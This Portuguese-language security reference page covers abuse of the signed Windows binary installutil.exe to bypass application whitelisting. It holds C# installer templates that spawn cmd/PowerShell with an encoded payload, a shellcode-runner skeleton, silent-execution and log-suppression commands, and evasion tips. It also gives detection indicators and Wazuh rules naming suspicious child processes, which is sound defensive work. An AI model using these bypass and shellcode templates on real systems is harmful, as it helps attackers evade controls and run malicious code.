# installutil.exe

**Plataforma:** Windows (.NET Framework)

**Categorias:** AWL Bypass, Execução de código .NET

**MITRE ATT&CK:** T1218.004 (System Binary Proxy Execution — InstallUtil)

**Referência ofensiva:** https://lolbas-project.github.io/lolbas/Binaries/Installutil/

---

## O que é o installutil.exe

O InstallUtil.exe é uma ferramenta de linha de comando do .NET Framework para instalar e desinstalar recursos de servidor executando componentes instaladores em assemblies .NET especificados. Faz parte do .NET Framework desde a versão 1.0 e está presente em qualquer sistema Windows com o .NET Framework instalado — o que inclui praticamente todos os sistemas Windows modernos.

Sua função é executar classes marcadas com o atributo `[RunInstaller(true)]`, que são chamadas durante a "instalação" ou "desinstalação" de um componente de servidor.

---

## Por que atacantes usam o installutil.exe

O InstallUtil é um bypass de Application Whitelist quase perfeito em termos de simplicidade: basta criar uma DLL ou EXE .NET com uma classe marcada como instalador e colocar o código malicioso no método `Install()` ou `Uninstall()`. O installutil.exe executa esse código ao processar o assembly.

Por ser um binário assinado pela Microsoft presente na lista de ferramentas de desenvolvedor confiáveis, é permitido por padrão pelo AppLocker e por muitas soluções de EDR configuradas com perfis permissivos.

---

## Técnicas de abuso

### Execução de código C# via classe instaladora

O código malicioso é implementado como uma classe que herda de `Installer` e é marcada com `[RunInstaller(true)]`:

```csharp
// Compilar com: csc /target:exe payload.cs
// Ou: csc /target:library payload.cs

using System;
using System.ComponentModel;
using System.Configuration.Install;
using System.Diagnostics;

[RunInstaller(true)]
public class MaliciousInstaller : Installer {
    public override void Install(System.Collections.IDictionary state) {
        Process.Start("cmd.exe", "/c whoami > C:\\temp\\out.txt");
    }

    public override void Uninstall(System.Collections.IDictionary state) {
        // Código também executado na desinstalação
        Process.Start("cmd.exe", "/c powershell.exe -enc <payload>");
    }
}
```

Execução:

```cmd
:: Executar o método Install()
installutil.exe payload.exe

:: Executar o método Uninstall() — menos monitorado
installutil.exe /U payload.exe
installutil.exe /uninstall payload.exe

:: Suprimir saída de log
installutil.exe /logfile= /LogToConsole=false payload.exe

:: Via caminho completo do .NET
C:\Windows\Microsoft.NET\Framework\v4.0.30319\installutil.exe payload.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe payload.exe
```

### Bypass de log via flags

```cmd
:: Suprimir completamente a saída de log e console
installutil.exe /logfile= /LogToConsole=false /U payload.exe
```

As flags `/logfile=` (sem valor — define arquivo de log como vazio, descartando-o) e `/LogToConsole=false` são frequentemente usadas para tornar a execução mais silenciosa.

### Shellcode runner via InstallUtil

```csharp
using System;
using System.ComponentModel;
using System.Configuration.Install;
using System.Runtime.InteropServices;

[RunInstaller(true)]
public class ShellcodeRunner : Installer {
    [DllImport("kernel32")] static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32")] static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, IntPtr i);
    [DllImport("kernel32")] static extern uint WaitForSingleObject(IntPtr h, uint t);

    public override void Uninstall(System.Collections.IDictionary state) {
        byte[] sc = new byte[] { /* shellcode */ };
        IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
        Marshal.Copy(sc, 0, mem, sc.Length);
        IntPtr t = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(t, 0xFFFFFFFF);
    }
}
```

---

## Técnicas de bypass e evasão

### Uso do método Uninstall em vez de Install

```cmd
:: Muitas detecções focam no Install — usar Uninstall pode contornar
installutil.exe /U /logfile= /LogToConsole=false payload.exe
```

### Variação de versão do .NET

```cmd
:: .NET 3.5
C:\Windows\Microsoft.NET\Framework\v2.0.50727\installutil.exe payload.exe

:: .NET 4.0 (32 bits)
C:\Windows\Microsoft.NET\Framework\v4.0.30319\installutil.exe payload.exe

:: .NET 4.0 (64 bits)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe payload.exe
```

---

## Detecção

### O que monitorar

**Indicadores de alta relevância:**

- installutil.exe executando arquivo fora de `Program Files` ou `Windows`
- installutil.exe com `/logfile=` e `/LogToConsole=false` combinados — tentativa de execução silenciosa
- installutil.exe iniciando processos filhos (cmd.exe, powershell.exe)
- installutil.exe iniciando conexão de rede

**Indicadores de média relevância:**

- installutil.exe com `/U` ou `/uninstall` sem contexto de desinstalação legítima
- installutil.exe executado por usuário comum sem necessidade de instalação de software

### Regra Wazuh

```xml
<!-- Arquivo: wazuh-rules/windows/0202-lolbas_awl_bypass.xml -->

<!-- installutil executando arquivo fora de caminhos de sistema -->
<rule id="100334" level="13">
  <if_group>sysmon_event1</if_group>
  <field name="win.eventdata.image" type="pcre2">(?i)installutil\.exe$</field>
  <field name="win.eventdata.commandLine" type="pcre2">(?i)(\\Users\\|\\Temp\\|\\Public\\|\\AppData\\|\\ProgramData\\)</field>
  <description>installutil.exe executando assembly de diretorio de usuario ou temporario — possivel AWL bypass</description>
  <mitre>
    <id>T1218.004</id>
  </mitre>
</rule>

<!-- installutil com flags de supressão de log -->
<rule id="100335" level="12">
  <if_group>sysmon_event1</if_group>
  <field name="win.eventdata.image" type="pcre2">(?i)installutil\.exe$</field>
  <field name="win.eventdata.commandLine" type="pcre2">(?i)/logfile=\s*/LogToConsole=false</field>
  <description>installutil.exe com supressao de log — padrao comum em uso malicioso silencioso</description>
  <mitre>
    <id>T1218.004</id>
  </mitre>
</rule>

<!-- installutil iniciando processo filho suspeito -->
<rule id="100336" level="14">
  <if_group>sysmon_event1</if_group>
  <field name="win.eventdata.parentImage" type="pcre2">(?i)installutil\.exe$</field>
  <field name="win.eventdata.image" type="pcre2">(?i)(cmd|powershell|wscript|mshta|rundll32)\.exe$</field>
  <description>installutil.exe gerou processo filho suspeito — execucao de codigo via classe instaladora .NET</description>
  <mitre>
    <id>T1218.004</id>
  </mitre>
</rule>
```

### Falsos positivos comuns e como reduzir o ruído

**Instalação legítima de componentes .NET:** o installutil é genuinamente usado por instaladores de software corporativo para registrar serviços e componentes Windows. O uso legítimo geralmente envolve assemblies em `Program Files`, executado durante janelas de manutenção ou instalação de software. A combinação `/logfile= /LogToConsole=false` com assembly em diretório temporário é praticamente sempre maliciosa.

---

## Proteção e controles defensivos

**AppLocker com restrição de developer tools:** o installutil está na categoria de "Trusted Developer Utilities" do AppLocker/WDAC. Avaliar se é necessário para usuários finais e administradores de servidor — em servidores de produção, raramente há necessidade de executar installutil manualmente após a instalação inicial do software.

**Monitorar processos filhos de installutil:** em ambientes onde o installutil é necessário, qualquer processo filho que não seja o serviço Windows sendo instalado deve gerar alerta imediato.

---

## Referências

- LOLBAS — installutil.exe: https://lolbas-project.github.io/lolbas/Binaries/Installutil/
- MITRE ATT&CK T1218.004: https://attack.mitre.org/techniques/T1218/004/
